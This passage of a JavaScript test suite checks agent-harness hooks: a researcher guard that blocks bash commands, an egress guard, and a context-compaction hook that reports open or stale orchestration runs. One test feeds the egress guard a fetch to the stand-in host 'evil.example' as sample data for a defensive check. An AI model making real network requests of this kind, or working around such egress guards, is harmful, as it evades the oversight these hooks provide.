  const scripts = ["researcher-guard.mjs", "egress-guard.mjs", "compact-context.mjs"];
  for (const s of scripts) writeFileSync(join(dup, ".claude", "hooks", s), "");
  writeFileSync(join(dup, ".claude", "settings.json"), JSON.stringify({ hooks: scripts.map((s) => `node .claude/hooks/${s}`) }));
  /** @param {string} script @param {unknown} input */
  const plugin = (script, input) => spawnSync(process.execPath, [script, "--plugin"], { input: JSON.stringify(input), env: { ...env(), CLAUDE_PROJECT_DIR: dup }, encoding: "utf8" });
  const r1 = plugin(RESEARCHER, bash("python3 x.py"));
  assert.deepEqual([r1.status, r1.stdout, r1.stderr], [0, "", ""]);
  const r2 = plugin(EGRESS, fetchInput("https://evil.example/", "afg1"));
  assert.deepEqual([r2.status, r2.stdout, r2.stderr], [0, "", ""]);
  // Without the project registration the plugin copy does act.
  const lone = join(scratch, "lone-project");
  mkdirSync(lone, { recursive: true });
  const r3 = spawnSync(process.execPath, [RESEARCHER, "--plugin"], { input: JSON.stringify(bash("python3 x.py")), env: { ...env(), CLAUDE_PROJECT_DIR: lone }, encoding: "utf8" });
  assert.equal(r3.status, 2);
});

test("compact-context: a closed run and a stale run are silent", () => {
  const sid = "sess-closed";
  const dir = join(scratch, "closed-project");
  const sdir = join(dir, ".claude", "state");
  mkdirSync(sdir, { recursive: true });
  const t0 = Date.now() - 60_000;
  const at = (/** @type {number} */ s) => new Date(t0 + s * 1000).toISOString();
  const onePlan = "PLAN REVIEW\nCONSTRAINTS:\nC1: tests pass\nSLICE: a\nFILES: src/a.ts\nDEPENDS: none\nGOAL: a\n";
  const launches = [
    launchRecord({ subagent_type: "reviewer", prompt: onePlan }, { sessionId: sid, agentId: "p1", ts: at(0) }),
    launchRecord({ subagent_type: "implementer", prompt: "SLICE: a\nFILES: src/a.ts\nDEPENDS: none" }, { sessionId: sid, agentId: "i1", ts: at(2) }),
    launchRecord({ subagent_type: "reviewer", prompt: "SLICE: a" }, { sessionId: sid, agentId: "r1", ts: at(4) }),
  ];
  const stops = [
    stopRecord({ sessionId: sid, agentId: "p1", role: "reviewer", slice: "plan", reply: "STATUS: pass", ts: at(1) }),
    stopRecord({ sessionId: sid, agentId: "i1", role: "implementer", slice: "a", reply: "STATUS: pass", ts: at(3) }),
    stopRecord({ sessionId: sid, agentId: "r1", role: "reviewer", slice: "a", reply: "STATUS: pass", ts: at(5) }),
  ];
  const jsonl = (/** @type {unknown[]} */ rs) => rs.map((l) => JSON.stringify(l)).join("\n") + "\n";
  writeFileSync(join(sdir, "journal-launches.jsonl"), jsonl(launches));
  writeFileSync(join(sdir, "journal.jsonl"), jsonl(stops));
  const call = (/** @type {Record<string, string>} */ extra = {}) =>
    spawnSync(process.execPath, [COMPACT], { input: JSON.stringify({ session_id: sid, source: "compact" }), env: { ...env(extra), CLAUDE_PROJECT_DIR: dir }, encoding: "utf8" });
  const closed = call();
  assert.deepEqual([closed.status, closed.stdout], [0, ""]);
  // Drop the review: the run is open again, and stale with ORCH_RUN_STALE_MIN=0.25 after 55 s of quiet.
  writeFileSync(join(sdir, "journal.jsonl"), jsonl(stops.slice(0, 2)));
  assert.match(call().stdout, /- a: building or reviewing/);
  const stale = call({ ORCH_RUN_STALE_MIN: "0.25" });
  assert.deepEqual([stale.status, stale.stdout], [0, ""]);
});
